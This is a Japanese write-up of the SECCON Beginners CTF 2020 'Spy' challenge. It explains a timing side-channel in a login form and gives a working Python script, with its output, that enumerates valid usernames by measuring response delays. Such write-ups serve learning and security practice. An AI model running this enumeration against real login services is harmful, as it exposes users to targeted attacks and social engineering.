# SECCON Beginners CTF 2020 "Spy" writeup

## 問題

```
As a spy, you are spying on the "ctf4b company".

You got the name-list of employees and the URL to the in-house web tool used by some of them.

Your task is to enumerate the employees who use this tool in order to make it available for social engineering.

app.py
employees.txt
```

## 解法

このシステムを使っているメンバーの名前を提出すれば代わりにフラグが返ってくるというもの。

ソースを見ると、まずその名前をみて存在の確認をしている。

もし名前が存在していれば、パスワードをハッシュ化して照合している。（※）

パスワードを間違えていると、Login failedの画面に飛ぶ。

メンバーの名前一覧は分かるのでそれぞれのメンバーでログインを試みることはできる。

解法としては、※の部分の処理に時間がかかることを気が付き、レスポンスが返ってくる時間でユーザーの存在の有無を調べる必要がある。

ユーザーが存在しないときにレスポンス返ってくる時間は0.3秒ほどであった。
存在するときは0.7秒くらいだった。

閾値を0.5秒とかにしておくと、存在するユーザーのみ抜き出すことができた。

```
#!/usr/bin/python
# coding : UTF-8
import sys
import requests
import time
def exploit():
    with open("employees.txt") as f:
        lines = [s.strip() for s in f.readlines()]
    url = 'https://spy.quals.beginners.seccon.jp/'
    for line in lines:
        payload = {'name': line, 'password': 'aaa'}
        start = time.time()
        responce = requests.post(url, data=payload)
        result = responce.text
        elapsed_time = time.time() - start
        if 0.5 < elapsed_time:
            print(line + " : " + str(elapsed_time))

if __name__ == "__main__":
    exploit()
```


```
$ python3 exploit.py
Elbert : 0.7758095264434814
George : 1.0648000240325928
Lazarus : 0.7373998165130615
Marc : 0.7939815521240234
Tony : 0.9620859622955322
Ximena : 0.7253859043121338
Yvonne : 0.884502649307251
```

これを送信してフラグをゲット